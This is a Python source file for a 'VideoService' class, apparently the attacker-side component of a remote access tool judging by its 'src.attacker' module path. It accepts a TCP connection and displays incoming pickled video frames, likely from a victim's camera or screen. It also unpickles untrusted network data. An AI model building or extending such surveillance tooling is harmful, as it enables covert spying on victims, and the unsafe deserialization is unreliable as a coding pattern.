from src.attacker.service.Service import Service
import cv2
import struct
import pickle
from pynput.keyboard import Key, Listener

RECV_CHUNK = 4096


class VideoService(Service):
    """Service that accepts a single TCP connection and displays incoming video frames."""

    def __init__(self, host: str, port: int):
        super().__init__(host, port)
        self.payload_size = struct.calcsize("L")
        self._keyboard_listener = None

    def _start_keyboard_listener(self) -> None:
        """Start a keyboard listener that stops the service on ESC."""
        def on_press(key):
            if key == Key.esc:
                self.running = False
                return False

        listener = Listener(on_press=on_press)
        listener.start()
        self._keyboard_listener = listener

    def run(self) -> None:
        """Accept connection and show frames until stopped."""
        try:
            self.setup_socket()
            self.accept_connection()
            if not self.conn:
                return

            data = b""
            self._start_keyboard_listener()

            while self.running:
                # read until we have enough bytes for the payload size
                while len(data) < self.payload_size and self.running:
                    chunk = self.conn.recv(RECV_CHUNK)
                    if not chunk:
                        self.running = False
                        break
                    data += chunk

                if not self.running:
                    break

                packed_msg_size = data[:self.payload_size]
                data = data[self.payload_size:]
                msg_size = struct.unpack("L", packed_msg_size)[0]

                # read full frame
                while len(data) < msg_size and self.running:
                    chunk = self.conn.recv(RECV_CHUNK)
                    if not chunk:
                        self.running = False
                        break
                    data += chunk

                if not self.running:
                    break

                frame_data = data[:msg_size]
                data = data[msg_size:]

                try:
                    frame = pickle.loads(frame_data)
                except Exception:
                    continue

                cv2.imshow("frame", frame)
                # small wait to allow imshow to update; key handling is via pynput
                cv2.waitKey(1)
        finally:
            try:
                if self.conn:
                    self.conn.close()
            except Exception:
                pass
            try:
                cv2.destroyAllWindows()
            except Exception:
                pass
            self.conn = None
